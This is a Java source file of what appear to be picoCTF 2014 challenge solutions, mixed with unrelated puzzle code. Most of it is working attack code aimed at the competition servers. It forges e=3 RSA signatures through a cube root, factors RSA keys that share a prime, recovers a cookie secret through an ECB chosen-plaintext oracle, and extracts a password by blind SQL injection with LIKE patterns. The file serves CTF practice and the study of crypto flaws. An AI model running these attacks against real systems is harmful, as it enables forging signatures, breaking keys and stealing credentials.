/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package test1;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Scanner;

/**
 *
 * @author leif
 */
public class Test1 {
    private static final BigInteger N = new BigInteger("c5ddc7decb1beede4ebb96742e4279eb120b9c8b44472c0d0bb39da95a10cf72b630dbea181eeda65772779de8b6af53f2b0c5c3eccae2ef7a349b66637345f1cc0dec4d63550206688751e49da001b2f901cf39ebb1758bae0a89a3a4f8342fa26283f802ce6df144113a2abe075497d373435f80aa96bdf1ea500f58eea6bffb28add63c9d337dacf3bbf81996c7b6b9ac532007010acedb0714a547486c78ca162a0a85c643ce774b2805bd294435d262fb390adce055b971396c0363bb5f7aa409f5c223fa9c211945cb6be7a8df23a3357257a11bfe4bd983799d975e9ba337e928c33a7cd9638c5f4553b2a263233442677f848e948ccc4470a5a5bc16682b3a24188398389a079096d28588f03d01b7bfa6cce9a829e2f5c1b1cc785e891ffa89d63607f48473126f99aca203e0c2e77f21a35b6d6c8816c0650715144ff148d9c60f81bfacbfc5ef879a07bb6cd8e12476803006cc7ae25e8faafa4ee52dac698d7927092d10c4fb748dea6b3dd62a3588cf315f54216689877f3f0d", 16);
    public static int ind(byte[] b, byte[] s){
        for (int i=0; i<b.length-s.length+1; i++){
            boolean w=true;
            for (int j=0; j<s.length && w; j++){
                if (b[j+i]!=s[j]){
                    w=false;
                }
            }
            if (w){
                return i;
            }
        }
        return -1;
    }
    public static String sha1(String s) throws Exception{
      MessageDigest localMessageDigest = MessageDigest.getInstance("SHA-1");
      byte[] arrayOfByte = localMessageDigest.digest(s.getBytes("UTF-8"));
      StringBuffer localStringBuffer = new StringBuffer();

      for (int i = 0; i < arrayOfByte.length; i++) {
        String str = Integer.toHexString(0xFF & arrayOfByte[i]);
        if (str.length() == 1) localStringBuffer.append('0');
        localStringBuffer.append(str);
      }

      return(localStringBuffer.toString());
    }
    public static boolean verifySignature(String paramString1, String paramString2) throws Exception
  {
    String str1 = sha1(paramString1);
    BigInteger localBigInteger1 = new BigInteger(paramString2, 16);
    BigInteger localBigInteger2 = localBigInteger1.modPow(new BigInteger("3"), N);
    String str2 = localBigInteger2.toString(16);
    while (str2.length() < 768) {
      str2 = "0" + str2;
    }
    if ((str2.indexOf("0001ffffffffff") == 0) && (str2.length() == 768) && 
      (str2.contains(str1))) {
      for (int i = str2.indexOf("f"); i < str2.indexOf(str1) - 2; i++) {
        if (str2.charAt(i) != 'f') return false;

      }

      return (str2.charAt(str2.indexOf(str1) - 2) == '0') && (str2.charAt(str2.indexOf(str1) - 1) == '0');
    }

    return false;
  }
    public static boolean verify1(String str11, String str22) throws Exception{
        String str1 = sha1(str11);
        /*
    BigInteger localBigInteger1 = new BigInteger(str22, 16);
    BigInteger localBigInteger2 = localBigInteger1.modPow(new BigInteger("3"), N);
    String str2 = localBigInteger2.toString(16);*/
        String str2=str22;
    while (str2.length() < 768) {
      str2 = "0" + str2;
    }
    System.out.println(str2);
    System.out.println("meow"+str2.contains(str1));
    System.out.println(str2.length());
    System.out.println(str2.indexOf("0001ffffffffff"));
    if ((str2.indexOf("0001ffffffffff") == 0) && (str2.length() == 768) && 
      (str2.contains(str1))) {
        System.out.println("cats");
        
      for (int i = str2.indexOf("f"); i < str2.indexOf(str1) - 2; i++) {
          System.out.println(i+","+str2.charAt(i));
        if (str2.charAt(i) != 'f') return false;

      }

      return (str2.charAt(str2.indexOf(str1) - 2) == '0') && (str2.charAt(str2.indexOf(str1) - 1) == '0');
    }

    return false;
    }
    /**
     * @param args the command line arguments
     */
    public static void main1(String[] args) throws Exception {
        String c="cat";
        String sig="879463257892345";
        while(sig.length()<700){
            sig="0"+sig;
        }
        sig="00"+sha1(c)+"fff"+sig;
        String st="0001ffffffffff";
        while(sig.length()<768-st.length()){
            sig="f"+sig;
        }
        sig=st+sig;
        System.out.println(sig);
        System.out.println(sig.length());
        
        
        
        BigInteger C=cbrt(new BigInteger(sig,16),new BigInteger(sig,16));
        System.out.println(C);
        System.out.println(C.pow(3));
        System.out.println(sha1(c));
        System.out.println(verifySignature(c,C.toString(16)));
        
        Socket s=new Socket("vuln2014.picoctf.com",4919);
        Scanner scan=new Scanner(System.in);
        InputStream i=s.getInputStream();
        OutputStream o=s.getOutputStream();
        o.write((c+" "+C.toString(16)+"\n").getBytes());
        Thread.sleep(1000);
            System.out.print("Resp>");
            System.out.print(new String(read(i)));
        while(true){
            
            String ni=scan.nextLine()+"\n";
            o.write(ni.getBytes());
            
            System.out.println("written");
            Thread.sleep(1000);
            System.out.print("Resp>");
            System.out.print(new String(read(i)));
        }
        /*
        FileInputStream f=new FileInputStream(new File("/Users/leijurv/Downloads/image.png"));
        byte[] b=new byte[f.available()];
        
        System.out.println(f.read(b));
        byte[] s="END".getBytes();
        System.out.println(ind(b,s));
        int ind=1548;
        byte[] res=new byte[b.length-ind];
        for (int i=ind; i<b.length; i++){
            res[i-ind]=b[i];
        }
        FileOutputStream ff=new FileOutputStream(new File("/Users/leijurv/Downloads/meow.gz"));
        ff.write(res);
        ff.close();*/
        
        
        /*
        int limit = 1500000;
        int[] triangles = new int[limit + 1];
        String t="{";
        int result = 0;
        int mlimit = (int) Math.sqrt(limit / 2);

        for (long m = 2; m < mlimit; m++) {
            for (long n = 1; n < m; n++) {
                if (((n + m) % 2) == 1 && GCD(n, m) == 1) {
                    long a = m * m + n * n;
                    long b = m * m - n * n;
                    long c = 2*m*n;
                    int p = (int) (a + b + c);
                    while (p <= limit) {
                        triangles[p]++;
                        if (triangles[p] == 1) {
                            result++;
                        }
                        if (triangles[p] == 2) {
                            result--;
                        }
                        p+=a+b+c;
                    }
                    //t=t+"{"+a+","+b+","+c+"},";
                }
            }
        }
        System.out.println(result);*/
    }
    public static byte[] read(InputStream f) throws Exception{
        ByteArrayOutputStream o=new ByteArrayOutputStream();
        byte[] cont=new byte[f.available()];
        while (f.available()>0){
            int j=f.read(cont);
            o.write(cont,0,j);
        }//Normally I just do one read, for f.avaialble() bytes, but sometimes that doesn't work on nonstandard things, like virtual filesystems
        return o.toByteArray();
    }
    public static long GCD(long a, long b) {
        if (b == 0) {
            return a;
        }
        return GCD(b, a % b);
    }
    static BigInteger TWO=new BigInteger("2");
    static BigInteger THREE=new BigInteger("3");
    public static BigInteger cbrt(BigInteger n,BigInteger number) {
        BigInteger guess = n.divide(BigInteger.valueOf((long) n.bitLength() / 3));
        boolean go = true;
        int c = 0;
        BigInteger test = guess;
        while (go) {
            BigInteger numOne = n.divide(guess.multiply(guess));
            BigInteger numTwo = guess.multiply(TWO);
            guess = numOne.add(numTwo).divide(THREE);
            if (numOne.equals(numTwo)) {
                go = false;
            }
            if (guess.mod(TWO).equals(BigInteger.ONE)) {
                guess = guess.add(BigInteger.ONE);
            }
            // System.out.println(guess.toString());
            c++;
            c %= 5;
            if (c == 4 && (test.equals(guess))) {
                return guess;
            }
            if (c == 2) {
                test = guess;
            }
        }

        if ((guess.multiply(guess)).equals(number)) {
            return guess;
        }
        return guess.add(BigInteger.ONE);
    }
    public static void main2(String[] args) throws Exception{
        BigInteger target=new BigInteger("c20a1d8b3903e1864d14a4d1f32ce57e4665fc5683960d2f7c0f30d5d247f5fa264fa66b49e801943ab68be3d9a4b393ae22963888bf145f07101616e62e0db2b04644524516c966d8923acf12af049a1d9d6fe3e786763613ee9b8f541291dcf8f0ac9dccc5d47565ef332d466bc80dc5763f1b1139f14d3c0bae072725815f",16);
BigInteger res=new BigInteger("b4f0de911375a3ec932b38f4aa82ea91a3873fe5c1a34458502d0edee2fe71c8f94a24fbaa30edf8dc08475013ad5e6e4d949205617530421ec3d4d2c83469b207c6b595bcc5b514751c43dec9d0b55e95d6437dd2d99d1d2dce252dbf0d8d89c5c4f1a0453ec2de1e6c53b5724ce05a7004fd52b180b831f39a0cbd060a7503",16);
BigInteger msg=new BigInteger("49f573321bdb3ad0a78f0e0c7cd4f4aa2a6d5911c90540ddbbaf067c6aabaccde78c8ff70c5a4abe7d4efa19074a5249b2e6525a0168c0c49535bc993efb7e2c221f4f349a014477d4134f03413fd7241303e634499313034dbb4ac96606faed5de01e784f2706e85bf3e814f5f88027b8aeccf18c928821c9d2d830b5050a1e",16);
BigInteger p=res.gcd(target);
BigInteger q=target.divide(p);
BigInteger e=new BigInteger("65537");
BigInteger t=(p.subtract(BigInteger.ONE)).multiply(q.subtract(BigInteger.ONE));
BigInteger d=e.modPow(new BigInteger("-1"),t);
System.out.println(p.multiply(q).subtract(target));
System.out.println(new String(msg.modPow(d,target).toByteArray()));
System.out.println(msg.modPow(d,target).modPow(e,target).toString(16));
if(true){
    return;
}
//ArrayList<BigInteger> keys=new ArrayList<BigInteger>(0);
        for (int i=0; i<50; i++){
            System.out.println(i);
            BigInteger k=getKey();
            BigInteger gc=k.gcd(target);
            if (gc.compareTo(BigInteger.ONE)!=0){
                return;
            }
            //keys.add(getKey());
        }
        /*
        for (int i=0; i<50; i++){
            for (int j=i+1; j<50; j++){
                BigInteger gc=keys.get(i).gcd(keys.get(j));
                
            }
        }*/
            
    }
    public static BigInteger getKey()  throws Exception{
        Socket s=new Socket("vuln2014.picoctf.com",51818);
        Scanner scan=new Scanner(System.in);
        InputStream i=s.getInputStream();
        OutputStream o=s.getOutputStream();
        /*o.write((c+" "+C.toString(16)+"\n").getBytes());
        Thread.sleep(1000);
            System.out.print("Resp>");
            System.out.print(new String(read(i)));*/
        Thread.sleep(100);
            System.out.print("Resp>");
            String n=new String(read(i));
            if (n.split("\n").length!=2){
                return getKey();
            }
            n=n.split("\n")[1];
            System.out.println(n);
            s.close();
            return new BigInteger(n,16);
    }
    public static String req(byte[] kitty,int pos) throws Exception{
         Socket s=new Socket("vuln2014.picoctf.com",65414);
        Scanner scan=new Scanner(System.in);
        InputStream i=s.getInputStream();
        OutputStream o=s.getOutputStream();
        o.write(new BigInteger(kitty).toString(16).getBytes());
        o.write("\n".getBytes());
        while(i.available()<200){
            Thread.sleep(50);
        }
        String ss=new String(read(i));
        String m=ss.split("\n")[1];
        System.out.println(ss.length()+","+ss);
        //System.out.println(m.substring(32,64));
        return m.substring(32*pos,32*(pos+1));
    }
    public static void findByte(int loc) throws Exception{
        
    }
    public static void main(String[] args) throws Exception{
        /*byte[] sadf="blahblahcat.123456789abcdef".getBytes();
        sadf[sadf.length-1]=32;
        req(sadf);
        System.out.println("MEOW");
        sadf="blahblahcat.123456789abcde".getBytes();
        req(sadf);*/
        String sf=" HTTP/1.1"+(char)13+(char)10+"Cookie: flag=congrats_on_your_first_ecb";
        System.out.println(sf.length());
        for (int pos=0; pos<10; pos++){
            String bas="blahblahca.0123456789abcdef0123456789abcdef0123456789abcdef";
            String tt=bas.substring(0,bas.length()-(1+sf.length()));
            System.out.println(tt+",");
            String tar=req(tt.getBytes(),3);
            System.out.println("Target: "+tar);
            String M=((bas.substring(0,bas.length()-(1+sf.length()))+sf)+"*");
            System.out.println(M);
        byte[] sadf=M.getBytes();
        sadf[sadf.length-1]=' ';
        if (req(sadf,3).equals(tar)){
            sf=sf+(char)sadf[sadf.length-1];
            continue;
        }
        sadf[sadf.length-1]='_';
        if (req(sadf,3).equals(tar)){
            sf=sf+(char)sadf[sadf.length-1];
            continue;
        }
        boolean d=false;
        for (byte b=97; b<=122; b++){
            System.out.print(sf+","+b);
            sadf[sadf.length-1]=b;
            String m=req(sadf,3);
            if (m.equals(tar)){
                sf=sf+(char)b;
                d=true;
                break;
            }
        }
        if (!d){
            System.out.println("NOTHING");
            break;
        }
        }
        /*
        Socket s=new Socket("vuln2014.picoctf.com",65414);
        Scanner scan=new Scanner(System.in);
        InputStream i=s.getInputStream();
        OutputStream o=s.getOutputStream();
        for (int I=1; I<=500; I++){
        //o.write("1\n2\n".getBytes());
        }
        byte[] sadf="234589789023456789653478652347896234578976234578923456783426".getBytes();
        o.write(new BigInteger(sadf).toString(16).getBytes());
        o.write("\n".getBytes());
        while(true){
            
        Thread.sleep(1000);
            byte[] d=read(i);
            
            /*for (int I=0; I<d.length; I++){
               System.out.print((char)d[I]+","+d[I]);
            }
            String n=new String(d);
             System.out.print(n);
             /*
            if (n.contains("$")){
                int ss=Integer.parseInt(getMon(n));
                int bet=(ss/10==0?1:ss/10);
                System.out.println("$$$"+ss+","+bet);
                
                o.write(("1\n2\n").getBytes());
            }
           
            
            String ni=scan.nextLine()+"\n";
            o.write(ni.getBytes());
            //o.write("\n".getBytes());
        }*/
    }
    public static String getMon(String n){
        String s=n.split("\\$")[1].split(" ")[0];
        s=s.substring(0,s.length()-1);
        return s;
    }
    public static void main3(String[] args) throws Exception{
        FileInputStream a=new FileInputStream(new File("/Users/leijurv/Downloads/meow.txt"));
        byte[] b=read(a);
        String[] d=new String(b).split("\n");
        BigInteger[] pubkeys=new BigInteger[7];
        int ind=0;
        BigInteger[] msgs=new BigInteger[7];
        int in=0;
        for (String s : d){
            if (s.length()!=0){
                if (s.contains(" ")){
                    System.out.println("key"+s);
                    pubkeys[ind++]=new BigInteger(s.split(" ")[0],16);
                }else{
                    System.out.println("msg"+s);
                    msgs[in++]=new BigInteger(s,16);
                }
            }
        }
        for (int i=0; i<7; i++){
        for (int j=i+1; j<7; j++){
            System.out.println(i+","+j+","+pubkeys[i].gcd(pubkeys[j]));
        }
    }
        //2,5
        BigInteger sec=new BigInteger("3590269856451989302180593140406037680332101518621341069833535104982141" +
"8226678404008136458766242975807162298586284913802142417334835025057914" +
"087641598894397684376184574077898561903813051842877771560",10);
        System.out.println(sec.modPow(new BigInteger("3"),pubkeys[2]).toString(16));
        BigInteger qq=new BigInteger("3989188729391099224645103489340041867035668354023712299815039005535713" +
"1362976004453484954184714417563513665095872126446824908149816694508793" +
"4307128876604418715290939711976650687820145020476419594");
        System.out.println(qq.add(new BigInteger("90")).multiply(new BigInteger("90")));
        System.out.println(sec);
        System.out.println(new String(qq.toByteArray()));
        
        BigInteger qq1=new BigInteger("3989188729391099224645103489340041867035668354023712299815039005535713" +
"1362976004453484954184714417563513665095872126446824908149816694508793" +
"4307128876604418715290939711976650687820145020476419594");
        System.out.println(msgs[6]);
        System.out.println(qq1.add(new BigInteger("188")).multiply(new BigInteger("188")).modPow(new BigInteger("3"),pubkeys[6]));
        System.out.println(new String(qq1.toByteArray()));
    }
    public static void main5(String[] args) throws Exception{
        String b="%_%";
        System.out.println(tes(b));
        String sf="YOULLNEVERGUESSTHISPASSWO";
        while(sf.length()<27){
            
            sf=sf+find(sf);
            System.out.println();
            System.out.println(sf);
            System.out.println();
        }
    }
    public static String find(String sf) throws Exception{
        for (char i='A'; i<='Z'; i++){
            System.out.print((sf+i+" "));
            if (tes(sf+i+"%")){
                return ""+i;
            }
            Thread.sleep(100);
        }
        
        for (char i='a'; i<='z'; i++){
            System.out.print(sf+i+" ");
            if (tes(sf+i+"%")){
                return ""+i;
            }
            Thread.sleep(100);
        }
        System.out.println(tes(sf+"\\_%"));
        return "\\_";
    }
    public static boolean tes(String th) throws Exception{
        return test("admin' AND LOWER(password) LIKE '"+th+"'; #");
    }
    public static boolean test(String th) throws Exception{
        String urlParameters = "username="+th;
String request = "http://web2014.picoctf.com/injection4/register.php";
URL url = new URL(request); 
HttpURLConnection connection = (HttpURLConnection) url.openConnection();           
connection.setDoOutput(true);
connection.setDoInput(true);
connection.setInstanceFollowRedirects(false); 
connection.setRequestMethod("POST"); 
connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); 
connection.setRequestProperty("charset", "utf-8");
connection.setRequestProperty("Content-Length", "" + Integer.toString(urlParameters.getBytes().length));
connection.setUseCaches (false);

DataOutputStream wr = new DataOutputStream(connection.getOutputStream ());
wr.writeBytes(urlParameters);
wr.flush();


wr.close();
Thread.sleep(100);
String s=new String(read(connection.getInputStream()));
//System.out.println(s);

if (s.contains("registered")){
    connection.disconnect();
    return true;
}
if (!s.contains("disabled")){
    s=new String(read(connection.getInputStream()));
    System.out.println(s);
}
connection.disconnect();
return false;
    }
    static ArrayList<String> moves=new ArrayList<String>();
    public static void main6(String[] args){
        hanoi(22,1,2);
        System.out.println(moves.size());
    }
    public static void hanoi(int depth, int tower1, int tower2){
        if (depth==1){
            moves.add("M"+tower1+","+tower2);
            return;
        }
        int o=oth(tower1,tower2);
        hanoi(depth-1,tower1,o);
        hanoi(1,tower1,tower2);
        hanoi(depth-1,o,tower2);
    }
    public static int oth(int tower1, int tower2){
        if (tower1==3||tower2==3){
            if (tower1==1||tower2==1){
                return 2;
            }else{
                return 1;
            }
        }else{
            return 3;
        }
    }
}